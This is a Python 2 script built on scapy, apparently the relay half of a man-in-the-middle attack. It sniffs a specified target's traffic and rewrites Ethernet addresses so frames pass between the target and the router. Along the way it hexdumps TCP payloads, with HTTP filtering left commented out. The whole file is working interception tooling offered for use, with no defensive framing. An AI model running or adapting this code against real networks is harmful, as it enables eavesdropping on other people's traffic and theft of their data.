from scapy.all import *
import socket


class Mitm(object):
    iface = 'enp0s31f6'
    targetip = '192.168.28.193'

    #mymac = '8c:ec:4b:47:a0:a0'
    #myip = '192.168.28.85'

    #routermac = '50:64:2b:6a:35:79'
    #routerip = '192.168.28.1'

    #targetmac = '94:65:2d:e2:3b:f2'

    # use a global raw socket to improve performance
    sockraw = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
    sockraw.bind((iface,0))

    def __init__(this):
        this.both = this.injection

    def init(this):
        this.getaddress()
        this.bpf = "host %s and ether dst host %s"%(this.targetip, this.mymac)

    def getaddress(this):
        import subprocess
        this.myip = subprocess.check_output("hostname -I",shell=1).strip('\n')
        tmprip = subprocess.check_output("ip route |grep default|awk '{print $3}'",shell=1)
        this.routerip = str(tmprip).strip('\n')
        this.routermac = subprocess.check_output \
            ("arp %s|grep ether|awk '{print $3}'"%this.routerip, shell=1).strip('\n')
        this.targetmac = subprocess.check_output \
            ( "arp %s|grep ether|awk '{print $3}'"%this.targetip, shell=1).strip('\n')
        this.mymac = subprocess.check_output \
            ("ifconfig %s|grep ether|awk '{print $2}'"%this.iface, shell=1).strip('\n')


    # tweak something in pkt, return True for droping it
    def injection(this,pkt):
        #print repr(pkt)
        eth = pkt
        #eth.src = '00:00:00:00:00:00'
        ip = eth.payload
        if ip.payload.name == 'TCP':
            tcp = ip.payload
            flags = tcp.flags
            if flags & 'P': # push flag
                t = raw(tcp.payload)
                #if t[0:4] != 'HTTP' \
                #    and t[0:3] != 'GET' \
                #    and t[0:4] != 'POST'  :
                #        return 
                print '\n-----------'

                print "eth\t%s -> %s"%(eth.src, eth.dst)
                print "ip\t%s -> %s"%(ip.src, ip.dst)
                print "tcp\t%s -> %s flags: %s"%(tcp.sport, ip.dport, tcp.flags)

                print hexdump(tcp.payload)
        return 

    def send(this,pkt):
        pass


    def recv(this,pkt):
        pass


    def both(this,pkt):
        pass

    def process(this,x):
        if x.name == 'Ethernet':
            if x.payload.name == "IP":
                # this is an ip package 
                if x.payload.dst != this.myip :
                    if x.src == this.routermac:
                        mymac = x.dst
                        x.dst = this.targetmac
                        if this.recv(x): # do some hack
                            return 
                    else:
                        mymac = x.dst
                        x.dst = this.routermac
                        if this.send(x): # do some hack
                            return 
                    # now the ether part is what it is without mitm

                    if this.both(x) : # do some hack
                        return 

                    x.src = mymac
                    # now the ether part is ok to send

                    try:
                        this.sockraw.send(raw(x))
                    except Exception,e:
                        print '\n-- err:'
                        print e
                        print '\n-- pkg:'
                        x.show()
                        exit()
        return 

    def run(this):
        this.init()
        this.capture = sniff(filter=this.bpf, prn = this.process)

def main():
    c = Mitm()
    c.run()


if __name__ == "__main__":
    main()
